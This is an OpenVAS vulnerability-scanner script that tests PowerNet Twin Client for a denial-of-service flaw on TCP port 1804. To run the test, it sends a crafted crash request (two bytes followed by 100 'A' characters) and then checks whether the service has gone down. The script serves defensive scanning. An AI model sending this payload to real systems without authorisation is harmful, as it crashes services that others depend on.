###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_powernet_twin_client_rfsync_dos_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# PowerNet Twin Client 'RFSynC' Denial of Service Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802905");
  script_version("$Revision: 4690 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-07-03 18:13:10 +0530 (Tue, 03 Jul 2012)");
  script_name("PowerNet Twin Client 'RFSynC' Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(1804);

  script_xref(name:"URL", value:"http://secunia.com/advisories/49754/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19456/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/powernet_1-adv.txt");

  tag_impact = "Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition.

  Impact Level: Application";

  tag_affected = "PowerNet Twin Client 8.9 and prior";

  tag_insight = "A signedness error in 'RFSync.exe' when processing certain
  requests, can be exploited to cause a crash via a specially crafted request sent
  to TCP port 1804.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "The host is running PowerNet Twin Client and is prone to denial of
  service vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

## Variable Initialization
req = "";
res = "";
port = 0;
soc = 0;
soc1 = 0;

## Port
port = 1804;

## Open the TCP socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct attack request
req = raw_string(0x11, 0x00) + crap(length:100, data:"A");

## Send crafted request
res = send(socket:soc, data:req);
close(soc);

sleep(2);

## Open the socket to confirm application is crashed
soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_message(port);
  exit(0);
}

close(soc1);
